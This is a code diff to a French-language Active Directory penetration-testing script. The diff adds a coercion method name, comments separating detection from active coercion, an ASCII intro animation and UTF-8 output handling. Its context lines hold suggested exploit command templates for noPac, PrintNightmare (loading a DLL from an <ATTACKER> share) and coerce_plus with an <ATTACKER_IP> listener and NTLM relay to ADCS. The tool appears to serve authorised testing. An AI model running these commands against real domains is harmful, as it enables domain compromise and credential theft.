@@ -1679,17 +1679,20 @@ def cve_checks(args, state, dc, authed=False):
             ("nopac", "CRIT", True, "CVE-2021-42278/42287 -> DA quasi direct"),
             ("printnightmare", "HIGH", True, "CVE-2021-34527 RCE spooler"),
             ("coerce_plus", "HIGH", True,
-             "coercion (PetitPotam/DFSCoerce/PrinterBug/ShadowCoerce) -> relais ADCS ESC8"),
+             "coercion (PetitPotam/DFSCoerce/PrinterBug/ShadowCoerce/MSEven) -> relais ADCS ESC8"),
         ]
     cmds = {
         "zerologon": f"python3 zerologon_tester.py <DC_HOST> {dc}   # check (exploit = cve-2020-1472, JAMAIS en prod)",
         "nopac": f"python3 noPac.py {args.domain}/{args.user}:<pass> -dc-ip {dc} -dc-host <DC_HOST> --impersonate administrator -use-ldap -shell",
         "printnightmare": f"python3 CVE-2021-1675.py {args.domain}/{args.user}:<pass>@{dc} '\\\\<ATTACKER>\\share\\payload.dll'",
-        "coerce_plus": (f"nxc smb {dc} -u {args.user} -p <pass> -M coerce_plus -o LISTENER=<ATTACKER>   "
+        # coerce_plus : SANS LISTENER= = CHECK seul (pas de coercion) ; AVEC LISTENER= = coercion ACTIVE
+        "coerce_plus": (f"nxc smb {dc} -u {args.user} -p <pass> -M coerce_plus -o LISTENER=<ATTACKER_IP>   "
                         f"# + ntlmrelayx.py -t ldap://{dc} --shadow-credentials  OU  certipy relay (ESC8)"),
     }
     for mod, sev, need_auth, note in checks:
         auth = nxc_auth(args) if need_auth else nxc_auth(args, null=True)
+        # NB coerce_plus sans '-o LISTENER=' = DETECTION seule (aucune coercion emise),
+        # coherent avec cve_checks() qui doit rester non-offensif.
         rc, out, _ = run_cmd([nxc, "smb", dc] + auth +
                              (["-d", args.domain] if (need_auth and args.domain) else []) +
                              ["-M", mod], 90)
@@ -2622,6 +2625,44 @@ BANNER = f"""{C.CY}{C.BD}
 {C.R}  [!] Usage AUTORISE uniquement : reste STRICTEMENT dans le scope.{C.X}
 """
 
+def intro_animation():
+    """Intro stylee au demarrage (art ASCII anime). Skip si sortie non-terminale."""
+    art = [
+        r" █████╗ ██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗",
+        r"██╔══██╗██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝",
+        r"███████║██║  ██║███████║██║   ██║██╔██╗ ██║   ██║   ",
+        r"██╔══██║██║  ██║██╔══██║██║   ██║██║╚██╗██║   ██║   ",
+        r"██║  ██║██████╔╝██║  ██║╚██████╔╝██║ ╚████║   ██║   ",
+        r"╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ",
+    ]
+    try:
+        tty = sys.stdout.isatty()
+    except Exception:
+        tty = False
+    if not tty:
+        _raw(BANNER)
+        return
+    grad = [C.B, C.CY, C.CY, C.G, C.G, C.GR]
+    _raw("")
+    for i, line in enumerate(art):
+        _raw(f"  {grad[i % len(grad)]}{C.BD}{line}{C.X}")
+        try:
+            time.sleep(0.045)
+        except Exception:
+            pass
+    _raw(f"     {C.CY}{C.BD}enumeration Active Directory{C.X}"
+         f"{C.GR}  -  tableau de bord vivant  -  by 12akHack{C.X}")
+    try:                                    # petit spinner d'initialisation
+        for _ in range(2):
+            for ch in "|/-\\":
+                sys.stdout.write(f"\r     {C.Y}initialisation {ch}{C.X}")
+                sys.stdout.flush()
+                time.sleep(0.028)
+        sys.stdout.write("\r" + " " * 44 + "\r")
+    except Exception:
+        pass
+    _raw(f"     {C.R}[!] Usage AUTORISE uniquement : reste STRICTEMENT dans le scope.{C.X}\n")
+
 def detect_env():
     ext = [t for t in ("nxc", "netexec", "crackmapexec", "nmap", "kerbrute",
                         "bloodhound-python", "certipy", "ldapsearch",
@@ -2689,7 +2730,13 @@ def main():
     p.add_argument("-o", "--loot", default="loot", help="Dossier de sortie (defaut loot/)")
     args = p.parse_args()
 
-    print(BANNER)
+    # UTF-8 (errors=replace) : l'art ASCII + le board ne crashent plus sur console cp1252
+    try:
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+    except Exception:
+        pass
+
+    intro_animation()
     if not args.target:
         p.print_help(); sys.exit(0)
 
